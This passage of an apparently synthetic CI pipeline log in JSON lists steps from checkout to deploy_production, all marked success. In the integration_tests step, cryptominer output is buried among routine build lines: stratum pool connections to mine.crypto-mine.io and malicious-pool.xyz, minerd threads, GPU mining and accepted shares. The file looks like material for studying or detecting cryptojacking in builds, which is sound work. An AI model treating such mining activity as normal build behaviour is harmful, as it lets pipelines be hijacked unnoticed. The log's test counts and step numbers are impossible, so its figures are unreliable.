          "\u2713 build completed",
          "HEAD is now at 5f9207f",
          "OK",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-9028",
          "Using Node.js 20.6.7",
          "Platform: linux-x64",
          "Bundling runtime.js",
          "Completed.",
          "Building Docker image...",
          "Transforming 865 files...",
          "npm install: added 235 packages",
          "  PASS: unit/test_auth_login.spec.js",
          "Processing...",
          "Ready.",
          "npm notice: package.json updated",
          "Step 13/16: Testing",
          "Step 3/24: Running migrations",
          "pip: Collecting eslint",
          "Uploading artifact 'build' (49 files)",
          "Done.",
          "TLS handshake completed",
          "\u2717 build failed with exit code 31",
          "Cache saved successfully",
          "Done.",
          "Platform: win32-x64",
          "Platform: win32-x64",
          "  PASS: e2e/test_cache_hit.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:47:57] DEBUG: Loading configuration",
          "[12:47:57] DEBUG: Query executed in 51ms",
          "Cache saved successfully",
          "Time: 24.485s",
          "Step 1/17: Building",
          "npm install: added 455 packages",
          "\u2713 Task completed in 460ms",
          "[12:47:57] ERROR: Connection failed",
          "\u2713 Task completed in 3104ms",
          "Ran 199 tests in 12s",
          "Cache restored successfully (197MB)",
          "[12:47:57] DEBUG: Connection pool: 5 active",
          "pip: Collecting jest",
          "Installing axios@5.9.0",
          "Success!",
          "Snapshots: 11 passed, 11 total",
          "Success!",
          "Cache restored successfully (336MB)",
          "pip: Downloading webpack-5.9.tar.gz",
          "[12:47:57] INFO: Starting build process",
          "\u2717 build failed with exit code 83",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: ValueError",
          "\u2713 Task completed in 708ms",
          "yarn add: Done in 26.87s",
          "Image pulled successfully",
          "Platform: linux-x64",
          "Step 8/24: Building",
          "OK",
          "npm install: resolved 578 packages",
          "Checking out develop branch",
          "Cache saved successfully",
          "[12:47:57] INFO: Processing request",
          "Pulling image: python:18",
          "pip install: Successfully installed prettier-4.0",
          "\u2713 All checks passed",
          "Exception: ValueError",
          "pip: Downloading axios-4.14.tar.gz",
          "Environment: development",
          "Connection established",
          "Generating source maps...",
          "Connection established",
          "Cache restored successfully (49MB)",
          "Cache restored successfully (236MB)",
          "HEAD is now at d638730",
          "Building Docker image...",
          "  PASS: test_api_health (340ms)",
          "Optimizing 75 modules...",
          "HEAD is now at 682c6d9",
          "pip: Installing build dependencies...",
          "  PASS: test_db_connect (259ms)",
          "\u2713 package completed",
          "[12:47:57] WARN: Deprecated API usage",
          "Ran 18 tests in 10s",
          "[12:47:57] DEBUG: Connection pool: 9 active",
          "\u2713 Step 'checkout' succeeded",
          "pip: Downloading express-5.2.tar.gz",
          "Environment: production",
          "Step 17/20: Installing dependencies",
          "Success!",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:57] WARN: Deprecated API usage",
          "Generating source maps...",
          "[12:47:57] INFO: Connecting to database",
          "Ready.",
          "Step 7/21: Linting",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_auth_login (182ms)",
          "Loading...",
          "WARNING: jest has known vulnerabilities",
          "Switched to branch 'bugfix/task-893'",
          "Layer 7/14: RUN command",
          "[12:47:57] WARN: Deprecated API usage",
          "Artifact downloaded: 16MB",
          "Completed.",
          "Done.",
          "[12:47:57] DEBUG: Memory usage: 269MB",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 7/22: Deploying",
          "Tests: 422 passed, 362 total",
          "yarn add: Done in 1.54s",
          "Installing prettier@1.2.9",
          "[12:47:57] DEBUG: Query executed in 19ms",
          "  PASS: unit/test_user_create.spec.js",
          "Finished.",
          "[12:47:57] INFO: Processing request",
          "pip: Downloading jest-5.16.tar.gz",
          "[12:47:57] DEBUG: Memory usage: 1689MB",
          "Fetching submodules...",
          "Compiling src/utils.go...",
          "Using Python 3.11",
          "Generating source maps...",
          "Fetching from https://gcr.io/package.json",
          "[12:47:57] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:57] DEBUG: Memory usage: 1378MB",
          "Completed.",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:47:57] INFO: Connecting to database",
          "Cache restored successfully (355MB)",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-04T12:48:46.429995",
        "finished_at": "2025-12-04T12:50:31.194032",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "yarn add: Done in 25.14s",
          "Coverage: 70% statements, 64% branches",
          "Artifact downloaded: 43MB",
          "Step 13/25: Building",
          "[12:47:57] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: e2e/test_auth_login.spec.js",
          "Done.",
          "npm install: resolved 1416 packages",
          "[12:47:57] INFO: Starting build process",
          "Step 13/21: Linting",
          "Using Node.js 16.11.1",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Uploading artifact 'dist' (49 files)",
          "\u2713 Step 'install' succeeded",
          "Cache miss for key-7469",
          "[12:47:57] DEBUG: Memory usage: 1345MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Optimizing 57 modules...",
          "Transforming 384 files...",
          "Step 5/16: Testing",
          "Pulling image: node:18",
          "\u2713 Task completed in 3089ms",
          "[12:47:57] DEBUG: Connection pool: 2 active",
          "[12:47:57] DEBUG: Memory usage: 1402MB",
          "Optimizing 45 modules...",
          "[12:47:57] WARN: Deprecated API usage",
          "Checking out develop branch",
          "Waiting...",
          "pip install: Successfully installed eslint-2.16",
          "Generating source maps...",
          "  PASS: unit/test_auth_login.spec.js",
          "  PASS: unit/test_user_create.spec.js",
          "HEAD is now at 721ba47",
          "Artifact uploaded: build.tar.gz (2MB)",
          "POST /api - 202 (441ms)",
          "NODE_ENV=development",
          "[12:47:57] INFO: Cache refreshed",
          "Step 9/16: Building",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /data - 201 (181ms)",
          "Cache miss for key-5332",
          "NODE_ENV=production",
          "pip: Downloading webpack-5.7.tar.gz",
          "Compiling components/app.ts...",
          "Layer 2/14: ENV command",
          "[12:47:57] DEBUG: Loading configuration",
          "Tests: 144 passed, 133 total",
          "[12:47:57] INFO: Starting build process",
          "Cache restored successfully (489MB)",
          "Cache restored successfully (51MB)",
          "POST /upload - 201 (172ms)",
          "Waiting...",
          "Completed.",
          "Tests: 90 passed, 297 total",
          "TLS handshake completed",
          "Building Docker image...",
          "WARNING: lodash has known vulnerabilities",
          "Completed.",
          "Ready.",
          "Compiling lib/service.java...",
          "[12:47:57] INFO: Cache refreshed",
          "Uploading artifact 'dist' (6 files)",
          "Environment: production",
          "\u2713 package completed",
          "Cache invalidated: node_modules",
          "Finished.",
          "Compiling utils/app.ts...",
          "\u2713 Task completed in 2497ms",
          "Compiling utils/app.ts...",
          "Platform: darwin-arm64",
          "HEAD is now at c3f9ea9",
          "HEAD is now at e284cbc",
          "WARNING: prettier has known vulnerabilities",
          "Compiling lib/index.js...",
          "Connection established",
          "Artifact downloaded: 45MB",
          "[12:47:57] DEBUG: Memory usage: 1406MB",
          "Transforming 418 files...",
          "Optimizing 58 modules...",
          "Ready.",
          "Fetching from https://github.com/package.json",
          "Completed.",
          "yarn add: Done in 14.22s",
          "Ready.",
          "[12:47:57] ERROR: Connection failed",
          "Already up to date.",
          "Fetching submodules...",
          "Test Suites: 29 passed, 6 total",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] INFO: Cache refreshed",
          "Creating production build...",
          "Cache saved successfully",
          "Test Suites: 29 passed, 43 total",
          "[12:47:57] DEBUG: Initializing service",
          "Exception: ValueError",
          "npm install: added 398 packages",
          "Using Node.js 15.2.9",
          "Tests: 374 passed, 365 total",
          "Processing...",
          "pip install: Successfully installed webpack-5.8",
          "Environment: production",
          "Using Python 3.12",
          "POST /data - 202 (10ms)",
          "pip: Downloading jest-5.16.tar.gz",
          "Waiting...",
          "GET /health - 201 (93ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Environment: test",
          "Already up to date.",
          "npm notice: package.json updated",
          "Verifying...",
          "[12:47:57] INFO: Starting build process",
          "Artifact uploaded: dist.zip (84MB)",
          "Waiting...",
          "Cache saved successfully",
          "Success!",
          "npm notice: package.json updated",
          "\u2713 Step 'checkout' succeeded",
          "Exception: NullPointerException",
          "Compiling utils/main.py...",
          "Success!",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Success!",
          "Exception: RuntimeError",
          "Verifying...",
          "Step 15/25: Installing dependencies",
          "Time: 54.28s",
          "HEAD is now at cc8762b",
          "Step 3/25: Testing",
          "Fetching from https://docker.io/package.json",
          "Artifact uploaded: dist.zip (45MB)",
          "yarn add: Done in 6.46s",
          "npm notice: package.json updated",
          "Finished.",
          "Finished.",
          "Cache saved successfully",
          "npm install: added 435 packages",
          "Creating production build...",
          "Switched to branch 'bugfix/task-943'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 6 passed, 43 total",
          "Artifact uploaded: dist.zip (100MB)",
          "Connection established",
          "Creating production build...",
          "Snapshots: 6 passed, 33 total",
          "pip: Collecting jest",
          "[12:47:57] INFO: Connecting to database",
          "Step 19/17: Deploying",
          "Test Suites: 29 passed, 38 total",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "\u2717 build failed with exit code 46",
          "Waiting...",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "GET /api - 204 (11ms)",
          "npm notice: package.json updated",
          "FAILED: test_cache_hit",
          "Time: 118.508s",
          "npm install: resolved 1166 packages",
          "Uploading artifact 'coverage' (17 files)",
          "[12:47:57] DEBUG: Memory usage: 1972MB",
          "Cache invalidated: dependencies",
          "Tests: 271 passed, 413 total",
          "  PASS: e2e/test_cache_hit.spec.js",
          "GET /status - 200 (73ms)",
          "Cache restored successfully (416MB)",
          "Compiling utils/handler.rs...",
          "FAILED: test_cache_hit",
          "\u2713 Step 'setup' succeeded",
          "Minifying app.js",
          "  PASS: test_cache_hit (13ms)",
          "Using Python 3.11",
          "Using Python 3.11",
          "[12:47:57] DEBUG: Memory usage: 794MB",
          "Uploading artifact 'dist' (34 files)",
          "\u2713 All checks passed",
          "Artifact downloaded: 23MB",
          "Step 10/25: Linting",
          "Test Suites: 18 passed, 14 total",
          "OK",
          "Snapshots: 22 passed, 31 total",
          "Generating source maps...",
          "Environment: test",
          "Completed.",
          "Already up to date.",
          "Pushing to registry...",
          "pip: Downloading lodash-3.7.tar.gz",
          "[12:47:57] DEBUG: Memory usage: 1550MB",
          "pip: Downloading eslint-3.3.tar.gz",
          "yarn add: Done in 19.81s",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache restored successfully (471MB)",
          "Step 6/21: Installing dependencies",
          "Fetching from https://googleapis.com/package.json",
          "pip: Collecting express",
          "[12:47:57] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: react has known vulnerabilities",
          "Switched to branch 'bugfix/task-847'",
          "Compiling lib/utils.go...",
          "[12:47:57] INFO: Request completed",
          "Bundling styles.js",
          "Verifying...",
          "Optimizing 78 modules...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-04T12:50:31.194032",
        "finished_at": "2025-12-04T12:51:41.036724",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Connection established",
          "Step 1/22: Deploying",
          "Accepted share #464",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (75MB)",
          "Switched to branch 'bugfix/task-200'",
          "OK",
          "  PASS: test_db_connect (488ms)",
          "npm install: added 131 packages",
          "Completed.",
          "Processing...",
          "OK",
          "  PASS: e2e/test_user_create.spec.js",
          "\u2713 test completed",
          "pip install: Successfully installed webpack-3.9",
          "Layer 3/8: RUN command",
          "Step 6/18: Deploying",
          "pip: Collecting jest",
          "pip install: Successfully installed axios-4.5",
          "Cache invalidated: node_modules",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] DEBUG: Initializing service",
          "[12:47:57] DEBUG: Connection pool: 3 active",
          "yarn add: Done in 4.21s",
          "\u2713 Step 'install' succeeded",
          "Step 19/25: Running migrations",
          "HEAD is now at c363fda",
          "minerd: 15 threads active",
          "Step 10/22: Testing",
          "\u2713 All checks passed",
          "Waiting...",
          "Switched to branch 'bugfix/task-601'",
          "Finished.",
          "GPU #1: 76\u00b0C, mining",
          "Step 3/19: Testing",
          "Compiling lib/main.py...",
          "[12:47:57] INFO: Cache refreshed",
          "Installing react@2.19.9",
          "Compiling utils/app.ts...",
          "Connecting to stratum+tcp://mine.crypto-mine.io:3333",
          "\u2717 build failed with exit code 86",
          "Fetching from https://googleapis.com/package.json",
          "Coverage: 93% statements, 67% branches",
          "Finished.",
          "\u2717 build failed with exit code 19",
          "Cache restored successfully (172MB)",
          "[12:47:57] INFO: Request completed",
          "Ready.",
          "Cache saved successfully",
          "[12:47:57] DEBUG: Connection pool: 19 active",
          "Already up to date.",
          "POST /upload - 201 (245ms)",
          "Pulling image: alpine:18",
          "Compiling components/utils.go...",
          "Bundling vendor.js",
          "Cache hit for key-1437",
          "[12:47:57] DEBUG: Connection pool: 5 active",
          "Accepted share #142",
          "Loading...",
          "[12:47:57] INFO: Request completed",
          "npm install: resolved 339 packages",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Ran 136 tests in 55s",
          "yarn add: Done in 21.0s",
          "[12:47:57] INFO: Connecting to database",
          "Waiting...",
          "Cache miss for key-2693",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing webpack@4.17.8",
          "Accepted share #371",
          "[12:47:57] ERROR: Connection failed",
          "Snapshots: 37 passed, 34 total",
          "Success!",
          "Done.",
          "Connecting to stratum+tcp://mine.crypto-mine.io:3333",
          "Coverage: 76% statements, 67% branches",
          "[12:47:57] WARN: Deprecated API usage",
          "Ran 44 tests in 34s",
          "Test Suites: 5 passed, 34 total",
          "[12:47:57] DEBUG: Initializing service",
          "Processing...",
          "[12:47:57] DEBUG: Memory usage: 795MB",
          "Using Node.js 16.11.8",
          "cryptonight: Hashrate: 3841 H/s",
          "[12:47:57] DEBUG: Connection pool: 19 active",
          "Bundling main.css",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Pushing to registry...",
          "  PASS: test_user_create (146ms)",
          "pip install: Successfully installed webpack-5.1",
          "WARNING: prettier has known vulnerabilities",
          "Loading...",
          "Processing...",
          "[12:47:57] DEBUG: Initializing service",
          "Using Node.js 15.0.0",
          "HEAD is now at 13aa895",
          "[12:47:57] ERROR: Connection failed",
          "Bundling runtime.js",
          "[12:47:57] DEBUG: Memory usage: 1937MB",
          "Compiling lib/utils.go...",
          "pip install: Successfully installed lodash-2.11",
          "Using Python 3.10",
          "Optimizing 60 modules...",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "\u2713 All checks passed",
          "Waiting...",
          "HEAD is now at 606d3c1",
          "Cache invalidated: build",
          "[12:47:57] INFO: Starting build process",
          "TLS handshake completed",
          "pip: Downloading jest-1.10.tar.gz",
          "Test Suites: 44 passed, 43 total",
          "pip: Collecting react",
          "Platform: darwin-arm64",
          "pip: Downloading axios-1.8.tar.gz",
          "pip install: Successfully installed webpack-2.4",
          "Fetching from https://githubusercontent.com/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "GET /api - 201 (62ms)",
          "Time: 22.774s",
          "Layer 10/9: COPY command",
          "Step 6/17: Deploying",
          "Ran 86 tests in 40s",
          "Processing...",
          "[12:47:57] DEBUG: Query executed in 21ms",
          "[12:47:57] INFO: Cache refreshed",
          "Step 15/21: Installing dependencies",
          "Optimizing 17 modules...",
          "Cache saved successfully",
          "[12:47:57] INFO: Connecting to database",
          "Installing express@4.0.6",
          "Connecting to stratum+tcp://mine.malicious-pool.xyz:3333",
          "Step 15/23: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "pip: Installing build dependencies...",
          "NODE_ENV=production",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] INFO: Starting build process",
          "Completed.",
          "Time: 78.73s",
          "[12:47:57] INFO: Connecting to database",
          "Checking out develop branch",
          "[12:47:57] DEBUG: Initializing service",
          "Building Docker image...",
          "pip: Collecting axios",
          "[12:47:57] DEBUG: Loading configuration",
          "Finished.",
          "Step 3/15: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "npm install: added 284 packages",
          "Artifact uploaded: dist.zip (82MB)",
          "Generating source maps...",
          "HEAD is now at 5c647ca",
          "Building Docker image...",
          "Already up to date.",
          "[12:47:57] INFO: Starting build process",
          "Creating production build...",
          "[12:47:57] WARN: Deprecated API usage",
          "pip: Collecting webpack",
          "Processing...",
          "[12:47:57] INFO: Starting build process",
          "Finished.",
          "Bundling vendor.js",
          "GPU #0: 66\u00b0C, mining",
          "Artifact downloaded: 50MB",
          "WARNING: jest has known vulnerabilities",
          "pip: Collecting prettier",
          "Step 1/23: Running migrations",
          "[12:47:57] INFO: Request completed",
          "Verifying...",
          "Verifying...",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Processing...",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /api - 201 (75ms)",
          "[12:47:57] DEBUG: Loading configuration",
          "Transforming 171 files...",
          "[12:47:57] INFO: Request completed",
          "Building Docker image...",
          "[12:47:57] DEBUG: Initializing service",
          "Step 14/16: Testing",
          "Artifact uploaded: dist.zip (35MB)",
          "Time: 25.968s",
          "Coverage: 100% statements, 92% branches",
          "Uploading artifact 'dist' (28 files)",
          "Test Suites: 39 passed, 42 total",
          "Layer 9/11: RUN command",
          "Using Python 3.9",
          "[12:47:57] WARN: Deprecated API usage",
          "GET /api - 200 (51ms)",
          "Cache restored successfully (142MB)",
          "minerd: 11 threads active",
          "Using Python 3.10",
          "Minifying app.js",
          "  PASS: unit/test_auth_login.spec.js",
          "Waiting...",
          "pip: Downloading axios-4.5.tar.gz",
          "Installing lodash@1.19.10",
          "POST /data - 202 (17ms)",
          "Connection established",
          "Tests: 244 passed, 277 total",
          "Artifact downloaded: 13MB",
          "TLS handshake completed",
          "Artifact downloaded: 36MB",
          "Cache miss for key-4646",
          "Compiling lib/app.ts...",
          "WARNING: express has known vulnerabilities",
          "[12:47:57] DEBUG: Connection pool: 7 active",
          "Done.",
          "Image pulled successfully",
          "Compiling components/service.java...",
          "Step 16/24: Testing",
          "Environment: development",
          "[12:47:57] ERROR: Connection failed",
          "Installing axios@4.11.1",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-04T12:51:41.036724",
        "finished_at": "2025-12-04T12:52:15.958070",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:47:57] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "Artifact downloaded: 16MB",
          "[12:47:57] INFO: Cache refreshed",
          "pip: Collecting lodash",
          "\u2717 build failed with exit code 38",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed webpack-4.2",
          "Done.",
          "Pulling image: node:3.11",
          "Generating source maps...",
          "Optimizing 23 modules...",
          "Cache restored successfully (22MB)",
          "[12:47:57] INFO: Starting build process",
          "[12:47:57] WARN: Deprecated API usage",
          "Optimizing 55 modules...",
          "Done.",
          "Cache invalidated: node_modules",
          "Layer 1/12: ENV command",
          "Compiling src/main.py...",
          "Installing eslint@5.12.5",
          "Already up to date.",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: dist.zip (99MB)",
          "  PASS: test_cache_hit (165ms)",
          "Step 17/15: Running migrations",
          "Waiting...",
          "Building Docker image...",
          "npm notice: package.json updated",
          "[12:47:57] DEBUG: Initializing service",
          "\u2717 build failed with exit code 4",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Task completed in 1946ms",
          "Layer 7/13: COPY command",
          "Platform: win32-x64",
          "Done.",
          "Done.",
          "NODE_ENV=test",
          "[12:47:57] DEBUG: Connection pool: 8 active",
          "Compiling lib/service.java...",
          "Optimizing 36 modules...",
          "Installing prettier@4.9.2",
          "Pushing to registry...",
          "Platform: darwin-arm64",
          "Minifying main.js",
          "[12:47:57] INFO: Request completed",
          "Transforming 474 files...",
          "npm notice: package.json updated",
          "Compiling src/index.js...",
          "Waiting...",
          "Compiling src/service.java...",
          "Cache invalidated: dependencies",
          "Building Docker image...",
          "Test Suites: 45 passed, 21 total",
          "pip: Downloading eslint-2.19.tar.gz",
          "Compiling components/index.js...",
          "POST /upload - 200 (99ms)",
          "\u2713 Task completed in 708ms",
          "Platform: darwin-arm64",
          "Checking out main branch",
          "npm notice: created a lockfile",
          "Platform: linux-x64",
          "[12:47:57] INFO: Starting build process",
          "Switched to branch 'hotfix/task-881'",
          "HEAD is now at 245f02b",
          "[12:47:57] INFO: Cache refreshed",
          "Artifact downloaded: 1MB",
          "Pushing to registry...",
          "Snapshots: 39 passed, 37 total",
          "Uploading artifact 'coverage' (31 files)",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Finished.",
          "Loading...",
          "  PASS: test_cache_hit (426ms)",
          "OK",
          "pip: Collecting webpack",
          "Transforming 152 files...",
          "NODE_ENV=test",
          "  PASS: unit/test_cache_hit.spec.js",
          "\u2713 Step 'install' succeeded",
          "Fetching from https://githubusercontent.com/package.json",
          "Cache miss for key-4277",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "HEAD is now at 4bb25ea",
          "Step 8/15: Testing",
          "Cache hit for key-8735",
          "Processing...",
          "[12:47:57] INFO: Processing request",
          "Ran 186 tests in 2s",
          "Cache invalidated: node_modules",
          "[12:47:57] DEBUG: Memory usage: 1320MB",
          "Loading...",
          "Layer 5/12: RUN command",
          "Artifact uploaded: dist.zip (25MB)",
          "Cache hit for key-5995",
          "[12:47:57] DEBUG: Loading configuration",
          "npm install: added 160 packages",
          "Cache invalidated: build",
          "Layer 7/10: RUN command",
          "Layer 7/15: RUN command",
          "[12:47:57] INFO: Request completed",
          "Bundling vendor.css",
          "FAILED: test_db_connect",
          "Image pulled successfully",
          "[12:47:57] INFO: Starting build process",
          "[12:47:57] WARN: Deprecated API usage",
          "Minifying main.js",
          "Layer 4/12: RUN command",
          "[12:47:57] DEBUG: Initializing service",
          "Building Docker image...",
          "HEAD is now at 515b1d9",
          "\u2717 build failed with exit code 91",
          "Building Docker image...",
          "GET /api - 204 (43ms)",
          "Building Docker image...",
          "Fetching from https://github.com/package.json",
          "Waiting...",
          "Step 8/19: Installing dependencies",
          "[12:47:57] DEBUG: Query executed in 59ms",
          "\u2717 build failed with exit code 67",
          "[12:47:57] INFO: Starting build process",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] INFO: Connecting to database",
          "Creating production build...",
          "Compiling utils/main.py...",
          "[12:47:57] INFO: Starting build process",
          "\u2713 Step 'setup' succeeded",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Fetching submodules...",
          "Loading...",
          "TLS handshake completed",
          "[12:47:57] INFO: Request completed",
          "FAILED: test_db_connect",
          "[12:47:57] DEBUG: Query executed in 19ms",
          "\u2713 Step 'test' succeeded",
          "Bundling runtime.js",
          "Already up to date.",
          "Uploading artifact 'dist' (10 files)",
          "HEAD is now at 32978d1",
          "Coverage: 93% statements, 67% branches",
          "[12:47:57] DEBUG: Loading configuration",
          "Using Node.js 14.8.10",
          "Compiling src/index.js...",
          "Transforming 223 files...",
          "Bundling main.css",
          "  PASS: test_cache_hit (125ms)",
          "Pushing to registry...",
          "Step 4/16: Deploying",
          "Coverage: 91% statements, 100% branches",
          "Coverage: 86% statements, 95% branches",
          "Compiling components/index.js...",
          "Switched to branch 'hotfix/task-118'",
          "Bundling vendor.js",
          "Using Node.js 16.12.3",
          "[12:47:57] DEBUG: Loading configuration",
          "[12:47:57] DEBUG: Connection pool: 11 active",
          "Step 12/18: Installing dependencies",
          "Loading...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Environment: development",
          "Uploading artifact 'coverage' (12 files)",
          "OK",
          "npm notice: package.json updated",
          "\u2713 Task completed in 657ms",
          "Test Suites: 11 passed, 13 total",
          "Cache invalidated: node_modules",
          "Image pulled successfully",
          "Platform: win32-x64",
          "pip: Collecting axios",
          "Cache miss for key-3853",
          "Installing eslint@3.4.7",
          "TLS handshake completed",
          "Processing...",
          "Building Docker image...",
          "Fetching from https://pypi.org/package.json",
          "WARNING: react has known vulnerabilities",
          "Bundling vendor.css",
          "Already up to date.",
          "[12:47:57] INFO: Starting build process",
          "Waiting...",
          "Platform: linux-x64",
          "Step 14/16: Running migrations",
          "Optimizing 75 modules...",
          "Fetching from https://pypi.org/package.json",
          "Bundling styles.css",
          "[12:47:57] INFO: Processing request",
          "pip install: Successfully installed prettier-3.10",
          "Optimizing 52 modules...",
          "[12:47:57] ERROR: Connection failed",
          "pip: Downloading jest-2.9.tar.gz",
          "Compiling components/index.js...",
          "Completed.",
          "Cache miss for key-4104",
          "[12:47:57] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (99MB)",
          "Checking out develop branch",
          "\u2713 Step 'build' succeeded",
          "OK",
          "GET /status - 200 (94ms)",
          "pip install: Successfully installed lodash-1.4",
          "TLS handshake completed",
          "Ready.",
          "Bundling styles.css",
          "npm install: added 133 packages",
          "Snapshots: 43 passed, 4 total",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-04T12:52:15.958070",
        "finished_at": "2025-12-04T12:52:29.926608",
        "log_lines": [
          "=== Step: deploy_production ===",
          "[12:47:57] INFO: Request completed",
          "pip: Installing build dependencies...",
          "WARNING: axios has known vulnerabilities",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (19MB)",
          "Using Node.js 17.12.3",
          "Artifact uploaded: dist.zip (79MB)",
          "Compiling utils/utils.go...",
          "npm install: resolved 1793 packages",
          "[12:47:57] INFO: Processing request",
          "yarn add: Done in 29.34s",
          "npm notice: package.json updated",
          "  PASS: integration/test_user_create.spec.js",
          "Connection established",
          "\u2713 lint completed",
          "Optimizing 28 modules...",
          "Minifying app.js",
          "\u2713 lint completed",
          "Compiling components/utils.go...",
          "NODE_ENV=test",
          "Snapshots: 0 passed, 9 total",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Generating source maps...",
          "Checking out develop branch",
          "npm install: resolved 1842 packages",
          "POST /upload - 201 (222ms)",
          "Fetching from https://gcr.io/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'checkout' succeeded",
          "  PASS: test_user_create (404ms)",
          "Tests: 82 passed, 293 total",
          "Artifact downloaded: 7MB",
          "Finished.",
          "Step 19/15: Building",
          "TLS handshake completed",
          "\u2713 Step 'test' succeeded",
          "Using Python 3.12",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache saved successfully",
          "Fetching from https://googleapis.com/package.json",
          "Switched to branch 'bugfix/task-688'",
          "Already up to date.",
          "[12:47:57] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "Connection established",
          "Ready.",
          "\u2713 Task completed in 1251ms",
          "pip: Installing build dependencies...",
          "Finished.",
          "Compiling components/index.js...",
          "Compiling components/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: added 241 packages",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "Test Suites: 12 passed, 48 total",
          "Fetching from https://docker.io/package.json",
          "Finished.",
          "Success!",
          "Generating source maps...",
          "pip install: Successfully installed prettier-3.16",
          "Verifying...",
          "Step 8/23: Testing",
          "Installing lodash@3.8.6",
          "Compiling lib/app.ts...",
          "Artifact downloaded: 20MB",
          "Artifact uploaded: dist.zip (82MB)",
          "pip install: Successfully installed axios-1.5",
          "Finished.",
          "[12:47:57] DEBUG: Connection pool: 7 active",
          "\u2713 Step 'test' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Finished.",
          "Cache hit for key-4332",
          "Installing react@5.15.6",
          "FAILED: test_auth_login",
          "[12:47:57] ERROR: Connection failed",
          "  PASS: test_auth_login (201ms)",
          "Checking out master branch",
          "Checking out develop branch",
          "Using Node.js 20.3.7",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Loading...",
          "\u2717 build failed with exit code 98",
          "Pulling image: node:latest",
          "Generating source maps...",
          "[12:47:57] DEBUG: Connection pool: 3 active",
          "Step 3/21: Building",
          "Creating production build...",
          "WARNING: lodash has known vulnerabilities",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed axios-2.5",
          "\u2713 Task completed in 838ms",
          "Artifact downloaded: 6MB",
          "pip: Downloading express-2.6.tar.gz",
          "Platform: darwin-arm64",
          "Generating source maps...",
          "Pulling image: python:latest",
          "Artifact downloaded: 40MB",
          "Layer 1/14: RUN command",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Exception: NullPointerException",
          "Switched to branch 'hotfix/task-950'",
          "Finished.",
          "[12:47:57] DEBUG: Query executed in 84ms",
          "TLS handshake completed",
          "Uploading artifact 'coverage' (39 files)",
          "pip install: Successfully installed lodash-5.14",
          "Using Node.js 20.0.9",
          "\u2713 Task completed in 2259ms",
          "Step 10/22: Installing dependencies",
          "NODE_ENV=production",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "Compiling components/handler.rs...",
